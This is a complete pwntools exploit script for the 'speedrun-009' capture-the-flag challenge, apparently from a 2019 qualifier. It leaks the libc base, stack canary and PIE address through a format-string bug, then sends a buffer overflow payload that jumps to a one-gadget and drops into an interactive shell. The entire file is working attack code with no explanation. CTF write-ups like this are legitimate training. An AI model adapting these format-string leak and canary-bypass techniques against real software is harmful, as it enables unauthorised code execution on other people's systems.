from pwn import *

conn = remote("speedrun-009.quals2019.oooverflow.io", 31337)
#conn = process("./speedrun-009")

def leak(num):
	conn.recvuntil("1, 2, or 3\n")
	conn.send("2")
	conn.sendline("A"*8+" %"+str(num)+"$lx\x00")
	conn.recvuntil('"')
	return ("0x"+conn.recvuntil('"?\n')[9:-3])
	
conn.recvuntil("Choose wisely.")

# leak libc address
leak_addr = int(leak(2),16)
base_addr = leak_addr-0x3ed8c0
log.info("base_addr : " + hex(base_addr))

# leak canary
canary = int(leak(163),16)
log.info("canary : " + hex(canary))

# leak pie address
pie_addr = int(leak(165),16) - 0xaac
log.info("pie_addr : " + hex(pie_addr))

system_offset = 0x4f440 
one_shot = base_addr + 0x4f2c5 # 0x4f2c5 0x4f322 0x10a38c

# trrigger BOF
payload  = "A"*0x408
payload += p64(canary)
payload += p64(pie_addr+0x2500)
payload += p64(one_shot)
payload += "\x00"*(0x5DC-1-len(payload))

conn.send("1")
conn.send(payload)

conn.recvuntil("1, 2, or 3\n")
conn.sendline("/bin/sh")

conn.interactive()